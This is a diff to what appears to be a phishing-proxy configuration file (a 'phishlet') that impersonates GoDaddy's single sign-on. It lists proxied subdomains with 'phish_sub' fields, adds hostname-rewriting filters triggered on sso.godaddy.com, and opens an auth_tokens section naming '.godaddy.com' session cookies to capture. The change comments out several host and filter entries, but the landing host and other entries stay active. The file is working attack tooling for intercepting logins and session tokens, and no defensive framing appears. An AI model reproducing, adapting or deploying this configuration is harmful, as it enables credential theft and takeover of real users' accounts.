@@ -8,14 +8,14 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'secureserver.net', session: true, is_landing: true, auto_filter: true}
 #  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: true, is_landing: false}
   - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: true, is_landing: false}
-  - {phish_sub: 'events', orig_sub: 'events', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'events', orig_sub: 'events', domain: 'secureserver.net', session: true, is_landing: false}
-  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'secureserver.net', session: true, is_landing: false}
-  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'secureserver.net', session: true, is_landing: false}
-  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'g', orig_sub: 'g', domain: 'godaddy.com', session: true, is_landing: false}
-  - {phish_sub: 'g', orig_sub: 'g', domain: 'secureserver.net', session: true, is_landing: false}
+#  - {phish_sub: 'events', orig_sub: 'events', domain: 'godaddy.com', session: true, is_landing: false}
+#  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing: false}
+#  - {phish_sub: 'events', orig_sub: 'events', domain: 'secureserver.net', session: true, is_landing: false}
+#  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'secureserver.net', session: true, is_landing: false}
+#  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'secureserver.net', session: true, is_landing: false}
+#  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing: false}
+#  - {phish_sub: 'g', orig_sub: 'g', domain: 'godaddy.com', session: true, is_landing: false}
+#  - {phish_sub: 'g', orig_sub: 'g', domain: 'secureserver.net', session: true, is_landing: false}
 
 sub_filters:
 #  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -24,22 +24,22 @@ sub_filters:
 #  - {triggers_on: 'sso.godaddy.com', orig_sub: 'img6', domain: 'wsimg.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'img1', domain: 'wsimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'img1', domain: 'wsimg.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'godaddy.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'events', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'csp', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'secureserver.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'sso.godaddy.com', orig_sub: 'g', domain: 'secureserver.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
   - domain: '.godaddy.com'
